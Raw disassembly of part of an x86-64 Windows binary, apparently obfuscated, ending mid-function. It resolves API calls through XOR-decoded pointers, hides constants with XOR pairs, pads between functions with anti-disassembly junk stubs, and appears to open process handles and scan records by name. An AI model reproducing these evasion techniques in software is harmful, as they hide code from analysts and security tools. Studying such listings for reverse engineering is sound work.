  403ca8:	e9 f0 03 00 00       	jmp    0x40409d
  403cad:	48 8d 05 6e 50 00 00 	lea    0x506e(%rip),%rax        # 0x408d22
  403cb4:	49 89 c3             	mov    %rax,%r11
  403cb7:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  403cbb:	49 89 c2             	mov    %rax,%r10
  403cbe:	4c 89 d1             	mov    %r10,%rcx
  403cc1:	4c 89 da             	mov    %r11,%rdx
  403cc4:	4c 8b 1d 85 61 00 00 	mov    0x6185(%rip),%r11        # 0x409e50
  403ccb:	48 8b 05 a6 61 00 00 	mov    0x61a6(%rip),%rax        # 0x409e78
  403cd2:	4c 33 18             	xor    (%rax),%r11
  403cd5:	41 ff d3             	call   *%r11
  403cd8:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
  403cdc:	48 8d 05 56 50 00 00 	lea    0x5056(%rip),%rax        # 0x408d39
  403ce3:	49 89 c3             	mov    %rax,%r11
  403ce6:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  403cea:	49 89 c2             	mov    %rax,%r10
  403ced:	4c 89 d1             	mov    %r10,%rcx
  403cf0:	4c 89 da             	mov    %r11,%rdx
  403cf3:	4c 8b 1d 8e 61 00 00 	mov    0x618e(%rip),%r11        # 0x409e88
  403cfa:	48 8b 05 af 61 00 00 	mov    0x61af(%rip),%rax        # 0x409eb0
  403d01:	4c 33 18             	xor    (%rax),%r11
  403d04:	41 ff d3             	call   *%r11
  403d07:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
  403d0b:	48 8d 05 45 50 00 00 	lea    0x5045(%rip),%rax        # 0x408d57
  403d12:	49 89 c3             	mov    %rax,%r11
  403d15:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  403d19:	49 89 c2             	mov    %rax,%r10
  403d1c:	4c 89 d1             	mov    %r10,%rcx
  403d1f:	4c 89 da             	mov    %r11,%rdx
  403d22:	4c 8b 1d 97 61 00 00 	mov    0x6197(%rip),%r11        # 0x409ec0
  403d29:	48 8b 05 b8 61 00 00 	mov    0x61b8(%rip),%rax        # 0x409ee8
  403d30:	4c 33 18             	xor    (%rax),%r11
  403d33:	41 ff d3             	call   *%r11
  403d36:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
  403d3a:	48 8d 05 31 50 00 00 	lea    0x5031(%rip),%rax        # 0x408d72
  403d41:	49 89 c3             	mov    %rax,%r11
  403d44:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  403d48:	49 89 c2             	mov    %rax,%r10
  403d4b:	4c 89 d1             	mov    %r10,%rcx
  403d4e:	4c 89 da             	mov    %r11,%rdx
  403d51:	4c 8b 1d a0 61 00 00 	mov    0x61a0(%rip),%r11        # 0x409ef8
  403d58:	48 8b 05 c1 61 00 00 	mov    0x61c1(%rip),%rax        # 0x409f20
  403d5f:	4c 33 18             	xor    (%rax),%r11
  403d62:	41 ff d3             	call   *%r11
  403d65:	48 89 45 d8          	mov    %rax,-0x28(%rbp)
  403d69:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
  403d6d:	48 83 f8 00          	cmp    $0x0,%rax
  403d71:	0f 84 1c 00 00 00    	je     0x403d93
  403d77:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  403d7b:	48 83 f8 00          	cmp    $0x0,%rax
  403d7f:	0f 84 0e 00 00 00    	je     0x403d93
  403d85:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
  403d89:	48 83 f8 00          	cmp    $0x0,%rax
  403d8d:	0f 85 28 00 00 00    	jne    0x403dbb
  403d93:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  403d97:	49 89 c2             	mov    %rax,%r10
  403d9a:	4c 89 d1             	mov    %r10,%rcx
  403d9d:	4c 8b 1d 8c 61 00 00 	mov    0x618c(%rip),%r11        # 0x409f30
  403da4:	48 8b 05 ad 61 00 00 	mov    0x61ad(%rip),%rax        # 0x409f58
  403dab:	4c 33 18             	xor    (%rax),%r11
  403dae:	41 ff d3             	call   *%r11
  403db1:	b8 00 00 00 00       	mov    $0x0,%eax
  403db6:	e9 e2 02 00 00       	jmp    0x40409d
  403dbb:	b8 05 00 00 00       	mov    $0x5,%eax
  403dc0:	49 89 c0             	mov    %rax,%r8
  403dc3:	31 c0                	xor    %eax,%eax
  403dc5:	49 89 c3             	mov    %rax,%r11
  403dc8:	31 c0                	xor    %eax,%eax
  403dca:	49 89 c2             	mov    %rax,%r10
  403dcd:	4c 89 d1             	mov    %r10,%rcx
  403dd0:	4c 89 da             	mov    %r11,%rdx
  403dd3:	4c 8b 5d f0          	mov    -0x10(%rbp),%r11
  403dd7:	41 ff d3             	call   *%r11
  403dda:	48 89 45 d0          	mov    %rax,-0x30(%rbp)
  403dde:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
  403de2:	48 83 f8 00          	cmp    $0x0,%rax
  403de6:	0f 85 28 00 00 00    	jne    0x403e14
  403dec:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  403df0:	49 89 c2             	mov    %rax,%r10
  403df3:	4c 89 d1             	mov    %r10,%rcx
  403df6:	4c 8b 1d 6b 61 00 00 	mov    0x616b(%rip),%r11        # 0x409f68
  403dfd:	48 8b 05 8c 61 00 00 	mov    0x618c(%rip),%rax        # 0x409f90
  403e04:	4c 33 18             	xor    (%rax),%r11
  403e07:	41 ff d3             	call   *%r11
  403e0a:	b8 00 00 00 00       	mov    $0x0,%eax
  403e0f:	e9 89 02 00 00       	jmp    0x40409d
  403e14:	b8 00 00 00 00       	mov    $0x0,%eax
  403e19:	89 45 cc             	mov    %eax,-0x34(%rbp)
  403e1c:	b8 00 00 00 00       	mov    $0x0,%eax
  403e21:	89 45 c8             	mov    %eax,-0x38(%rbp)
  403e24:	b8 00 00 00 00       	mov    $0x0,%eax
  403e29:	89 45 c4             	mov    %eax,-0x3c(%rbp)
  403e2c:	31 c0                	xor    %eax,%eax
  403e2e:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
  403e33:	31 c0                	xor    %eax,%eax
  403e35:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
  403e3a:	48 8d 45 c4          	lea    -0x3c(%rbp),%rax
  403e3e:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
  403e43:	48 8d 45 c8          	lea    -0x38(%rbp),%rax
  403e47:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
  403e4c:	8b 45 cc             	mov    -0x34(%rbp),%eax
  403e4f:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
  403e54:	31 c0                	xor    %eax,%eax
  403e56:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
  403e5b:	b8 03 00 00 00       	mov    $0x3,%eax
  403e60:	49 89 c1             	mov    %rax,%r9
  403e63:	b8 30 00 00 00       	mov    $0x30,%eax
  403e68:	49 89 c0             	mov    %rax,%r8
  403e6b:	b8 00 00 00 00       	mov    $0x0,%eax
  403e70:	49 89 c3             	mov    %rax,%r11
  403e73:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
  403e77:	49 89 c2             	mov    %rax,%r10
  403e7a:	4c 89 d1             	mov    %r10,%rcx
  403e7d:	4c 89 da             	mov    %r11,%rdx
  403e80:	4c 8b 5d e8          	mov    -0x18(%rbp),%r11
  403e84:	41 ff d3             	call   *%r11
  403e87:	8b 45 c8             	mov    -0x38(%rbp),%eax
  403e8a:	48 83 c0 38          	add    $0x38,%rax
  403e8e:	48 c1 e0 20          	shl    $0x20,%rax
  403e92:	48 c1 e8 20          	shr    $0x20,%rax
  403e96:	89 45 cc             	mov    %eax,-0x34(%rbp)
  403e99:	8b 45 cc             	mov    -0x34(%rbp),%eax
  403e9c:	49 89 c2             	mov    %rax,%r10
  403e9f:	4c 89 d1             	mov    %r10,%rcx
  403ea2:	4c 8b 1d f7 60 00 00 	mov    0x60f7(%rip),%r11        # 0x409fa0
  403ea9:	48 8b 05 18 61 00 00 	mov    0x6118(%rip),%rax        # 0x409fc8
  403eb0:	4c 33 18             	xor    (%rax),%r11
  403eb3:	41 ff d3             	call   *%r11
  403eb6:	48 89 45 b8          	mov    %rax,-0x48(%rbp)
  403eba:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
  403ebe:	48 83 f8 00          	cmp    $0x0,%rax
  403ec2:	0f 85 39 00 00 00    	jne    0x403f01
  403ec8:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
  403ecc:	49 89 c2             	mov    %rax,%r10
  403ecf:	4c 89 d1             	mov    %r10,%rcx
  403ed2:	4c 8b 5d e0          	mov    -0x20(%rbp),%r11
  403ed6:	41 ff d3             	call   *%r11
  403ed9:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  403edd:	49 89 c2             	mov    %rax,%r10
  403ee0:	4c 89 d1             	mov    %r10,%rcx
  403ee3:	4c 8b 1d ee 60 00 00 	mov    0x60ee(%rip),%r11        # 0x409fd8
  403eea:	48 8b 05 0f 61 00 00 	mov    0x610f(%rip),%rax        # 0x40a000
  403ef1:	4c 33 18             	xor    (%rax),%r11
  403ef4:	41 ff d3             	call   *%r11
  403ef7:	b8 00 00 00 00       	mov    $0x0,%eax
  403efc:	e9 9c 01 00 00       	jmp    0x40409d
  403f01:	8b 45 cc             	mov    -0x34(%rbp),%eax
  403f04:	49 89 c0             	mov    %rax,%r8
  403f07:	b8 00 00 00 00       	mov    $0x0,%eax
  403f0c:	49 89 c3             	mov    %rax,%r11
  403f0f:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
  403f13:	49 89 c2             	mov    %rax,%r10
  403f16:	4c 89 d1             	mov    %r10,%rcx
  403f19:	4c 89 da             	mov    %r11,%rdx
  403f1c:	4c 8b 1d ed 60 00 00 	mov    0x60ed(%rip),%r11        # 0x40a010
  403f23:	48 8b 05 0e 61 00 00 	mov    0x610e(%rip),%rax        # 0x40a038
  403f2a:	4c 33 18             	xor    (%rax),%r11
  403f2d:	41 ff d3             	call   *%r11
  403f30:	31 c0                	xor    %eax,%eax
  403f32:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
  403f37:	31 c0                	xor    %eax,%eax
  403f39:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
  403f3e:	48 8d 45 c4          	lea    -0x3c(%rbp),%rax
  403f42:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
  403f47:	48 8d 45 c8          	lea    -0x38(%rbp),%rax
  403f4b:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
  403f50:	8b 45 cc             	mov    -0x34(%rbp),%eax
  403f53:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
  403f58:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
  403f5c:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
  403f61:	b8 03 00 00 00       	mov    $0x3,%eax
  403f66:	49 89 c1             	mov    %rax,%r9
  403f69:	b8 30 00 00 00       	mov    $0x30,%eax
  403f6e:	49 89 c0             	mov    %rax,%r8
  403f71:	b8 00 00 00 00       	mov    $0x0,%eax
  403f76:	49 89 c3             	mov    %rax,%r11
  403f79:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
  403f7d:	49 89 c2             	mov    %rax,%r10
  403f80:	4c 89 d1             	mov    %r10,%rcx
  403f83:	4c 89 da             	mov    %r11,%rdx
  403f86:	4c 8b 5d e8          	mov    -0x18(%rbp),%r11
  403f8a:	41 ff d3             	call   *%r11
  403f8d:	89 45 b4             	mov    %eax,-0x4c(%rbp)
  403f90:	b8 00 00 00 00       	mov    $0x0,%eax
  403f95:	89 45 b0             	mov    %eax,-0x50(%rbp)
  403f98:	8b 45 b4             	mov    -0x4c(%rbp),%eax
  403f9b:	83 f8 00             	cmp    $0x0,%eax
  403f9e:	0f 84 a9 00 00 00    	je     0x40404d
  403fa4:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
  403fa8:	48 89 45 a8          	mov    %rax,-0x58(%rbp)
  403fac:	b8 00 00 00 00       	mov    $0x0,%eax
  403fb1:	89 45 a4             	mov    %eax,-0x5c(%rbp)
  403fb4:	8b 45 a4             	mov    -0x5c(%rbp),%eax
  403fb7:	8b 4d c4             	mov    -0x3c(%rbp),%ecx
  403fba:	39 c8                	cmp    %ecx,%eax
  403fbc:	0f 83 8b 00 00 00    	jae    0x40404d
  403fc2:	e9 0d 00 00 00       	jmp    0x403fd4
  403fc7:	8b 45 a4             	mov    -0x5c(%rbp),%eax
  403fca:	89 c1                	mov    %eax,%ecx
  403fcc:	83 c0 01             	add    $0x1,%eax
  403fcf:	89 45 a4             	mov    %eax,-0x5c(%rbp)
  403fd2:	eb e0                	jmp    0x403fb4
  403fd4:	8b 45 a4             	mov    -0x5c(%rbp),%eax
  403fd7:	b9 89 1e 24 3e       	mov    $0x3e241e89,%ecx
  403fdc:	81 f1 b1 1e 24 3e    	xor    $0x3e241eb1,%ecx
  403fe2:	48 0f af c1          	imul   %rcx,%rax
  403fe6:	48 8b 4d a8          	mov    -0x58(%rbp),%rcx
  403fea:	48 01 c1             	add    %rax,%rcx
  403fed:	48 8b 45 18          	mov    0x18(%rbp),%rax
  403ff1:	49 89 c3             	mov    %rax,%r11
  403ff4:	48 8b 09             	mov    (%rcx),%rcx
  403ff7:	49 89 ca             	mov    %rcx,%r10
  403ffa:	4c 89 d1             	mov    %r10,%rcx
  403ffd:	4c 89 da             	mov    %r11,%rdx
  404000:	4c 8b 1d 41 60 00 00 	mov    0x6041(%rip),%r11        # 0x40a048
  404007:	48 8b 05 62 60 00 00 	mov    0x6062(%rip),%rax        # 0x40a070
  40400e:	4c 33 18             	xor    (%rax),%r11
  404011:	41 ff d3             	call   *%r11
  404014:	83 f8 00             	cmp    $0x0,%eax
  404017:	0f 85 2b 00 00 00    	jne    0x404048
  40401d:	8b 45 a4             	mov    -0x5c(%rbp),%eax
  404020:	b9 9e 32 f8 fd       	mov    $0xfdf8329e,%ecx
  404025:	81 f1 a6 32 f8 fd    	xor    $0xfdf832a6,%ecx
  40402b:	48 0f af c1          	imul   %rcx,%rax
  40402f:	48 8b 4d a8          	mov    -0x58(%rbp),%rcx
  404033:	48 01 c1             	add    %rax,%rcx
  404036:	48 83 c1 10          	add    $0x10,%rcx
  40403a:	48 83 c1 1c          	add    $0x1c,%rcx
  40403e:	8b 09                	mov    (%rcx),%ecx
  404040:	89 4d b0             	mov    %ecx,-0x50(%rbp)
  404043:	e9 05 00 00 00       	jmp    0x40404d
  404048:	e9 7a ff ff ff       	jmp    0x403fc7
  40404d:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
  404051:	49 89 c2             	mov    %rax,%r10
  404054:	4c 89 d1             	mov    %r10,%rcx
  404057:	4c 8b 1d 22 60 00 00 	mov    0x6022(%rip),%r11        # 0x40a080
  40405e:	48 8b 05 43 60 00 00 	mov    0x6043(%rip),%rax        # 0x40a0a8
  404065:	4c 33 18             	xor    (%rax),%r11
  404068:	41 ff d3             	call   *%r11
  40406b:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
  40406f:	49 89 c2             	mov    %rax,%r10
  404072:	4c 89 d1             	mov    %r10,%rcx
  404075:	4c 8b 5d e0          	mov    -0x20(%rbp),%r11
  404079:	41 ff d3             	call   *%r11
  40407c:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  404080:	49 89 c2             	mov    %rax,%r10
  404083:	4c 89 d1             	mov    %r10,%rcx
  404086:	4c 8b 1d 2b 60 00 00 	mov    0x602b(%rip),%r11        # 0x40a0b8
  40408d:	48 8b 05 4c 60 00 00 	mov    0x604c(%rip),%rax        # 0x40a0e0
  404094:	4c 33 18             	xor    (%rax),%r11
  404097:	41 ff d3             	call   *%r11
  40409a:	8b 45 b0             	mov    -0x50(%rbp),%eax
  40409d:	c9                   	leave
  40409e:	c3                   	ret
  40409f:	cc                   	int3
  4040a0:	cc                   	int3
  4040a1:	e8 00 00 00 00       	call   0x4040a6
  4040a6:	48 83 c4 08          	add    $0x8,%rsp
  4040aa:	c3                   	ret
  4040ab:	90                   	nop
  4040ac:	90                   	nop
  4040ad:	cc                   	int3
  4040ae:	90                   	nop
  4040af:	eb 0b                	jmp    0x4040bc
  4040b1:	48 31 c0             	xor    %rax,%rax
  4040b4:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  4040bb:	90                   	nop
  4040bc:	55                   	push   %rbp
  4040bd:	48 89 e5             	mov    %rsp,%rbp
  4040c0:	48 81 ec 20 00 00 00 	sub    $0x20,%rsp
  4040c7:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
  4040cb:	48 8b 45 10          	mov    0x10(%rbp),%rax
  4040cf:	48 83 c0 14          	add    $0x14,%rax
  4040d3:	b9 00 00 00 00       	mov    $0x0,%ecx
  4040d8:	89 08                	mov    %ecx,(%rax)
  4040da:	48 8b 45 10          	mov    0x10(%rbp),%rax
  4040de:	48 83 c0 18          	add    $0x18,%rax
  4040e2:	31 c9                	xor    %ecx,%ecx
  4040e4:	48 89 08             	mov    %rcx,(%rax)
  4040e7:	48 8b 45 10          	mov    0x10(%rbp),%rax
  4040eb:	48 83 c0 10          	add    $0x10,%rax
  4040ef:	b9 00 00 00 00       	mov    $0x0,%ecx
  4040f4:	89 08                	mov    %ecx,(%rax)
  4040f6:	48 8b 45 10          	mov    0x10(%rbp),%rax
  4040fa:	31 c9                	xor    %ecx,%ecx
  4040fc:	48 89 08             	mov    %rcx,(%rax)
  4040ff:	48 8b 45 10          	mov    0x10(%rbp),%rax
  404103:	48 83 c0 08          	add    $0x8,%rax
  404107:	31 c9                	xor    %ecx,%ecx
  404109:	48 89 08             	mov    %rcx,(%rax)
  40410c:	48 8b 45 10          	mov    0x10(%rbp),%rax
  404110:	48 83 c0 20          	add    $0x20,%rax
  404114:	49 89 c2             	mov    %rax,%r10
  404117:	4c 89 d1             	mov    %r10,%rcx
  40411a:	4c 8b 1d 17 5c 00 00 	mov    0x5c17(%rip),%r11        # 0x409d38
  404121:	48 8b 05 38 5c 00 00 	mov    0x5c38(%rip),%rax        # 0x409d60
  404128:	4c 33 18             	xor    (%rax),%r11
  40412b:	41 ff d3             	call   *%r11
  40412e:	48 8b 45 10          	mov    0x10(%rbp),%rax
  404132:	49 89 c2             	mov    %rax,%r10
  404135:	4c 89 d1             	mov    %r10,%rcx
  404138:	4c 8b 1d 31 5c 00 00 	mov    0x5c31(%rip),%r11        # 0x409d70
  40413f:	48 8b 05 52 5c 00 00 	mov    0x5c52(%rip),%rax        # 0x409d98
  404146:	4c 33 18             	xor    (%rax),%r11
  404149:	41 ff d3             	call   *%r11
  40414c:	48 8b 45 10          	mov    0x10(%rbp),%rax
  404150:	49 89 c2             	mov    %rax,%r10
  404153:	4c 89 d1             	mov    %r10,%rcx
  404156:	4c 8b 1d 4b 5c 00 00 	mov    0x5c4b(%rip),%r11        # 0x409da8
  40415d:	48 8b 05 6c 5c 00 00 	mov    0x5c6c(%rip),%rax        # 0x409dd0
  404164:	4c 33 18             	xor    (%rax),%r11
  404167:	41 ff d3             	call   *%r11
  40416a:	c9                   	leave
  40416b:	c3                   	ret
  40416c:	cc                   	int3
  40416d:	cc                   	int3
  40416e:	e8 00 00 00 00       	call   0x404173
  404173:	48 83 c4 08          	add    $0x8,%rsp
  404177:	c3                   	ret
  404178:	90                   	nop
  404179:	90                   	nop
  40417a:	cc                   	int3
  40417b:	90                   	nop
  40417c:	eb 0b                	jmp    0x404189
  40417e:	48 31 c0             	xor    %rax,%rax
  404181:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  404188:	90                   	nop
  404189:	55                   	push   %rbp
  40418a:	48 89 e5             	mov    %rsp,%rbp
  40418d:	48 81 ec 80 00 00 00 	sub    $0x80,%rsp
  404194:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
  404198:	31 c0                	xor    %eax,%eax
  40419a:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
  40419e:	b8 30 00 00 00       	mov    $0x30,%eax
  4041a3:	89 45 c8             	mov    %eax,-0x38(%rbp)
  4041a6:	31 c0                	xor    %eax,%eax
  4041a8:	48 89 45 d0          	mov    %rax,-0x30(%rbp)
  4041ac:	b8 00 00 00 00       	mov    $0x0,%eax
  4041b1:	89 45 e0             	mov    %eax,-0x20(%rbp)
  4041b4:	31 c0                	xor    %eax,%eax
  4041b6:	48 89 45 d8          	mov    %rax,-0x28(%rbp)
  4041ba:	31 c0                	xor    %eax,%eax
  4041bc:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
  4041c0:	31 c0                	xor    %eax,%eax
  4041c2:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
  4041c6:	8b 45 10             	mov    0x10(%rbp),%eax
  4041c9:	48 89 45 b8          	mov    %rax,-0x48(%rbp)
  4041cd:	31 c0                	xor    %eax,%eax
  4041cf:	48 89 45 c0          	mov    %rax,-0x40(%rbp)
  4041d3:	48 8d 05 d0 4f 00 00 	lea    0x4fd0(%rip),%rax        # 0x4091aa
  4041da:	49 89 c2             	mov    %rax,%r10
  4041dd:	4c 89 d1             	mov    %r10,%rcx
  4041e0:	4c 8b 1d 19 70 00 00 	mov    0x7019(%rip),%r11        # 0x40b200
  4041e7:	48 8b 05 3a 70 00 00 	mov    0x703a(%rip),%rax        # 0x40b228
  4041ee:	4c 33 18             	xor    (%rax),%r11
  4041f1:	41 ff d3             	call   *%r11
  4041f4:	48 89 45 b0          	mov    %rax,-0x50(%rbp)
  4041f8:	48 8b 45 b0          	mov    -0x50(%rbp),%rax
  4041fc:	48 83 f8 00          	cmp    $0x0,%rax
  404200:	0f 85 07 00 00 00    	jne    0x40420d
  404206:	31 c0                	xor    %eax,%eax
  404208:	e9 72 00 00 00       	jmp    0x40427f
  40420d:	48 8d 05 b2 4f 00 00 	lea    0x4fb2(%rip),%rax        # 0x4091c6
  404214:	49 89 c3             	mov    %rax,%r11
  404217:	48 8b 45 b0          	mov    -0x50(%rbp),%rax
  40421b:	49 89 c2             	mov    %rax,%r10
  40421e:	4c 89 d1             	mov    %r10,%rcx
  404221:	4c 89 da             	mov    %r11,%rdx
  404224:	4c 8b 1d 0d 70 00 00 	mov    0x700d(%rip),%r11        # 0x40b238
  40422b:	48 8b 05 2e 70 00 00 	mov    0x702e(%rip),%rax        # 0x40b260
  404232:	4c 33 18             	xor    (%rax),%r11
  404235:	41 ff d3             	call   *%r11
  404238:	48 89 45 a8          	mov    %rax,-0x58(%rbp)
  40423c:	48 8b 45 a8          	mov    -0x58(%rbp),%rax
  404240:	48 83 f8 00          	cmp    $0x0,%rax
  404244:	0f 85 07 00 00 00    	jne    0x404251
  40424a:	31 c0                	xor    %eax,%eax
  40424c:	e9 2e 00 00 00       	jmp    0x40427f
  404251:	48 8d 45 b8          	lea    -0x48(%rbp),%rax
  404255:	49 89 c1             	mov    %rax,%r9
  404258:	48 8d 45 c8          	lea    -0x38(%rbp),%rax
  40425c:	49 89 c0             	mov    %rax,%r8
  40425f:	b8 78 04 00 00       	mov    $0x478,%eax
  404264:	49 89 c3             	mov    %rax,%r11
  404267:	48 8d 45 f8          	lea    -0x8(%rbp),%rax
  40426b:	49 89 c2             	mov    %rax,%r10
  40426e:	4c 89 d1             	mov    %r10,%rcx
  404271:	4c 89 da             	mov    %r11,%rdx
  404274:	4c 8b 5d a8          	mov    -0x58(%rbp),%r11
  404278:	41 ff d3             	call   *%r11
  40427b:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  40427f:	c9                   	leave
  404280:	c3                   	ret
  404281:	cc                   	int3
  404282:	cc                   	int3
  404283:	e8 00 00 00 00       	call   0x404288
  404288:	48 83 c4 08          	add    $0x8,%rsp
  40428c:	c3                   	ret
  40428d:	90                   	nop
  40428e:	90                   	nop
  40428f:	cc                   	int3
  404290:	90                   	nop
  404291:	eb 0b                	jmp    0x40429e
  404293:	48 31 c0             	xor    %rax,%rax
  404296:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  40429d:	90                   	nop
  40429e:	55                   	push   %rbp
  40429f:	48 89 e5             	mov    %rsp,%rbp
  4042a2:	48 81 ec b0 02 00 00 	sub    $0x2b0,%rsp
  4042a9:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
  4042ad:	b8 0e 4e 0c 3d       	mov    $0x3d0c4e0e,%eax
  4042b2:	81 f0 16 4e 0c 3d    	xor    $0x3d0c4e16,%eax
  4042b8:	49 89 c0             	mov    %rax,%r8
  4042bb:	b8 00 00 00 00       	mov    $0x0,%eax
  4042c0:	49 89 c3             	mov    %rax,%r11
  4042c3:	48 8d 45 e8          	lea    -0x18(%rbp),%rax
  4042c7:	49 89 c2             	mov    %rax,%r10
  4042ca:	4c 89 d1             	mov    %r10,%rcx
  4042cd:	4c 89 da             	mov    %r11,%rdx
  4042d0:	4c 8b 1d e9 77 00 00 	mov    0x77e9(%rip),%r11        # 0x40bac0
  4042d7:	48 8b 05 0a 78 00 00 	mov    0x780a(%rip),%rax        # 0x40bae8
  4042de:	4c 33 18             	xor    (%rax),%r11
  4042e1:	41 ff d3             	call   *%r11
  4042e4:	48 8d 05 6d 51 00 00 	lea    0x516d(%rip),%rax        # 0x409458
  4042eb:	49 89 c2             	mov    %rax,%r10
  4042ee:	4c 89 d1             	mov    %r10,%rcx
  4042f1:	4c 8b 1d 00 78 00 00 	mov    0x7800(%rip),%r11        # 0x40baf8
  4042f8:	48 8b 05 21 78 00 00 	mov    0x7821(%rip),%rax        # 0x40bb20
  4042ff:	4c 33 18             	xor    (%rax),%r11
  404302:	41 ff d3             	call   *%r11
  404305:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
  404309:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
  40430d:	48 83 f8 00          	cmp    $0x0,%rax
  404311:	0f 85 0a 00 00 00    	jne    0x404321
  404317:	b8 00 00 00 00       	mov    $0x0,%eax
  40431c:	e9 fb 04 00 00       	jmp    0x40481c
  404321:	4c 8b 1d 08 78 00 00 	mov    0x7808(%rip),%r11        # 0x40bb30
  404328:	48 8b 05 29 78 00 00 	mov    0x7829(%rip),%rax        # 0x40bb58
  40432f:	4c 33 18             	xor    (%rax),%r11
  404332:	41 ff d3             	call   *%r11
  404335:	b9 18 00 00 00       	mov    $0x18,%ecx
  40433a:	49 89 c9             	mov    %rcx,%r9
  40433d:	48 8d 4d e8          	lea    -0x18(%rbp),%rcx
  404341:	49 89 c8             	mov    %rcx,%r8
  404344:	48 8b 4d e0          	mov    -0x20(%rbp),%rcx
  404348:	49 89 cb             	mov    %rcx,%r11
  40434b:	49 89 c2             	mov    %rax,%r10
  40434e:	4c 89 d1             	mov    %r10,%rcx
  404351:	4c 89 da             	mov    %r11,%rdx
  404354:	4c 8b 1d 0d 78 00 00 	mov    0x780d(%rip),%r11        # 0x40bb68
  40435b:	48 8b 05 2e 78 00 00 	mov    0x782e(%rip),%rax        # 0x40bb90
  404362:	4c 33 18             	xor    (%rax),%r11
  404365:	41 ff d3             	call   *%r11
  404368:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  40436c:	48 89 45 d8          	mov    %rax,-0x28(%rbp)
  404370:	b8 08 02 00 00       	mov    $0x208,%eax
  404375:	49 89 c0             	mov    %rax,%r8
  404378:	b8 00 00 00 00       	mov    $0x0,%eax
  40437d:	49 89 c3             	mov    %rax,%r11
  404380:	48 8d 85 d0 fd ff ff 	lea    -0x230(%rbp),%rax
  404387:	49 89 c2             	mov    %rax,%r10
  40438a:	4c 89 d1             	mov    %r10,%rcx
  40438d:	4c 89 da             	mov    %r11,%rdx
  404390:	4c 8b 1d 09 78 00 00 	mov    0x7809(%rip),%r11        # 0x40bba0
  404397:	48 8b 05 2a 78 00 00 	mov    0x782a(%rip),%rax        # 0x40bbc8
  40439e:	4c 33 18             	xor    (%rax),%r11
  4043a1:	41 ff d3             	call   *%r11
  4043a4:	b8 04 01 00 00       	mov    $0x104,%eax
  4043a9:	49 89 c3             	mov    %rax,%r11
  4043ac:	48 8d 85 d0 fd ff ff 	lea    -0x230(%rbp),%rax
  4043b3:	49 89 c2             	mov    %rax,%r10
  4043b6:	4c 89 d1             	mov    %r10,%rcx
  4043b9:	4c 89 da             	mov    %r11,%rdx
  4043bc:	4c 8b 1d 15 78 00 00 	mov    0x7815(%rip),%r11        # 0x40bbd8
  4043c3:	48 8b 05 36 78 00 00 	mov    0x7836(%rip),%rax        # 0x40bc00
  4043ca:	4c 33 18             	xor    (%rax),%r11
  4043cd:	41 ff d3             	call   *%r11
  4043d0:	83 f8 00             	cmp    $0x0,%eax
  4043d3:	0f 85 0a 00 00 00    	jne    0x4043e3
  4043d9:	b8 00 00 00 00       	mov    $0x0,%eax
  4043de:	e9 39 04 00 00       	jmp    0x40481c
  4043e3:	48 8d 05 aa 50 00 00 	lea    0x50aa(%rip),%rax        # 0x409494
  4043ea:	49 89 c3             	mov    %rax,%r11
  4043ed:	48 8d 85 d0 fd ff ff 	lea    -0x230(%rbp),%rax
  4043f4:	49 89 c2             	mov    %rax,%r10
  4043f7:	4c 89 d1             	mov    %r10,%rcx
  4043fa:	4c 89 da             	mov    %r11,%rdx
  4043fd:	4c 8b 1d 0c 78 00 00 	mov    0x780c(%rip),%r11        # 0x40bc10
  404404:	48 8b 05 2d 78 00 00 	mov    0x782d(%rip),%rax        # 0x40bc38
  40440b:	4c 33 18             	xor    (%rax),%r11
  40440e:	41 ff d3             	call   *%r11
  404411:	31 c0                	xor    %eax,%eax
  404413:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
  404418:	b8 00 00 00 00       	mov    $0x0,%eax
  40441d:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
  404422:	b8 03 00 00 00       	mov    $0x3,%eax
  404427:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
  40442c:	31 c0                	xor    %eax,%eax
  40442e:	49 89 c1             	mov    %rax,%r9
